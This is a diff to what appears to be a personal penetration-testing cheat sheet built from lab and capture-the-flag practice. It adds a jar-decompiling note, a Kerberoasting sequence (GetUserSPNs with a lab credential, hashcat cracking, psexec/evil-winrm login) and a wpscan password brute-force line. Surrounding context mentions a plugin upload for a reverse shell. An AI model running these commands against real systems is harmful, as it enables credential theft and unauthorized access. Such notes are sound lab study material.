@@ -202,7 +202,13 @@ Once got access get rev shell
 		Upload this plugin.zip into plugins and install and activate to get shell back
 		
 		
-		
+=========
+jar files
+=========
+Use online compilers to compile the file
+	http://www.javadecompilers.com/
+	
+	
 ===============
 base 64 stuffs
 ===============
@@ -582,6 +588,11 @@ smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 10.20
 ==============
 - MS14-068
 - GetUserSPNs
+	./GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
+	hashcat -h |grep -i tgs
+	hashcat -m 13100 hash.txt -a 0 /usr/share/wordlists/rockyou.txt --force --show
+	Use psexec or evil-win-rm to login with obtained creds
+
 
 
 ==============
@@ -1084,6 +1095,8 @@ Bruteforcing WPSCAN giving password file and user list
 sudo wpscan --url http://wordy/ --passwords /home/kali/Desktop/kpasswords.txt --usernames /home/kali/Desktop/users.txt 
 
 wpscan --url http://192.168.0.18 --wordlist=/root/Downloads/fsocity.dic --username elliot
+
+wpscan –u http://10.10.10.46 --username falaraki --wordlist /root/Desktop/list.txt
 
 wpscan --url http://192.168.6.145 -P /root/Downloads/fsocity.dic -U elliot
 
